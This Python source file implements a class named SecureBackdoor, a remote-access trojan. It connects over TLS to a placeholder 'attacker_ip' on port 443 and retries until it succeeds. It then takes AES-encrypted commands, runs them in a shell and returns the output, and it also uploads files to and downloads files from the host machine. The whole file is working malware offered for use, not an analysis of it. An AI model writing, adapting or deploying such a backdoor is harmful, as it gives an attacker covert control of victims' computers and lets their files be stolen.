
import os
import socket
import ssl
import subprocess
import base64
import json
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

class SecureBackdoor:
    def __init__(self, server_ip, server_port, key):
        self.server_ip = server_ip
        self.server_port = server_port
        self.key = key
        self.sock = None
        
    def encrypt(self, data):
        nonce = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        return base64.b64encode(nonce + tag + ciphertext).decode()
    
    def decrypt(self, encrypted_data):
        data = base64.b64decode(encrypted_data.encode())
        nonce = data[:16]
        tag = data[16:32]
        ciphertext = data[32:]
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode()
    
    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock = ssl.wrap_socket(self.sock)
                self.sock.connect((self.server_ip, self.server_port))
                break
            except:
                time.sleep(30)
                
    def execute_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return output.decode()
        except Exception as e:
            return str(e)
            
    def handle_file_transfer(self, data):
        action = data['action']
        if action == 'upload':
            file_path = data['path']
            content = data['content']
            with open(file_path, 'wb') as f:
                f.write(base64.b64decode(content))
            return {'status': 'success'}
        elif action == 'download':
            file_path = data['path']
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    content = f.read()
                return {
                    'status': 'success',
                    'content': base64.b64encode(content).decode()
                }
            else:
                return {'status': 'error', 'message': 'File not found'}
                
    def start(self):
        self.connect()
        while True:
            try:
                encrypted_data = self.sock.recv(4096).decode()
                if not encrypted_data:
                    continue
                    
                data = self.decrypt(encrypted_data)
                message = json.loads(data)
                
                if message['type'] == 'command':
                    result = self.execute_command(message['command'])
                    response = {
                        'type': 'result',
                        'command': message['command'],
                        'output': result
                    }
                    
                elif message['type'] == 'file_transfer':
                    result = self.handle_file_transfer(message['data'])
                    response = {
                        'type': 'file_response',
                        'request_id': message['request_id'],
                        'data': result
                    }
                    
                encrypted_response = self.encrypt(json.dumps(response))
                self.sock.send(encrypted_response.encode())
                
            except Exception as e:
                self.connect()

if __name__ == '__main__':
    key = b'32-byte-key-for-AES-256'
    backdoor = SecureBackdoor('attacker_ip', 443, key)
    backdoor.start()